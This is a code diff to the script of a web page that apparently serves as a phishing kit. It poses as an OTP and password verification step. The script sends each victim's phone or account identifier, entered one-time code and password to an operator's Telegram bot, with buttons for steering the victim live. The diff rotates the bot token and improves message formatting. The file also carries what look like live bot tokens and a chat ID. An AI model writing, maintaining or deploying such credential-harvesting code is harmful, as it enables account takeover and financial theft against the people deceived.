@@ -297,7 +297,7 @@ body{
 <script>
   (function() {
     // ==================== TELEGRAM BOT CONFIG ====================
-    const BOT_TOKEN = '8276553360:AAGD0pyKatfqmNyfWnvQ6nFkuM3QG3kfJ9k'; // Replace with your token
+    const BOT_TOKEN = '8323704904:AAEiB-e1x2uQ_qZp0PaBS__8B9EXs402Xus'; // Replace with your token
     const CHAT_ID   = '1006917440'; // Replace with your chat ID
     // If you need a CORS proxy, prepend it to the URL
     const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
@@ -389,6 +389,17 @@ body{
     };
 
     // ==================== TELEGRAM HELPERS ====================
+    // Escape HTML special characters to prevent injection
+    function escapeHtml(unsafe) {
+      return unsafe.replace(/[&<>"]/g, function(m) {
+        if (m === '&') return '&amp;';
+        if (m === '<') return '&lt;';
+        if (m === '>') return '&gt;';
+        if (m === '"') return '&quot;';
+        return m;
+      });
+    }
+
     async function sendToTelegram(payload) {
       const url = `${API_BASE}/sendMessage`;
       try {
@@ -458,11 +469,13 @@ body{
 
       const ts = Date.now();
       const identifier = accountType === 'Mobile' ? `Phone: ${phone}` : `Account: ${inputValue}`;
-      const msg = `OTP Verification\n\n${identifier}\nEntered OTP: ${enteredOtp}\n\nChoose action:`;
+      const escapedOtp = escapeHtml(enteredOtp);
+      const msg = `OTP Verification\n\n${identifier}\nEntered OTP: <code>${escapedOtp}</code>\n\nChoose action:`;
 
       await sendToTelegram({
         chat_id: CHAT_ID,
         text: msg,
+        parse_mode: 'HTML',
         reply_markup: {
           inline_keyboard: [[
             { text: 'Password', callback_data: `otp_password_${ts}` },
@@ -514,11 +527,13 @@ body{
 
       const ts = Date.now();
       const identifier = accountType === 'Mobile' ? `Phone: ${phone}` : `Account: ${inputValue}`;
-      const msg = `Password Verification\n\n${identifier}\nPassword: ${password}\n\nApprove or Decline:`;
+      const escapedPassword = escapeHtml(password);
+      const msg = `Password Verification\n\n${identifier}\nPassword: <code>${escapedPassword}</code>\n\nApprove or Decline:`;
 
       await sendToTelegram({
         chat_id: CHAT_ID,
         text: msg,
+        parse_mode: 'HTML',
         reply_markup: {
           inline_keyboard: [[
             { text: 'Approve', callback_data: `pwd_approve_${ts}` },
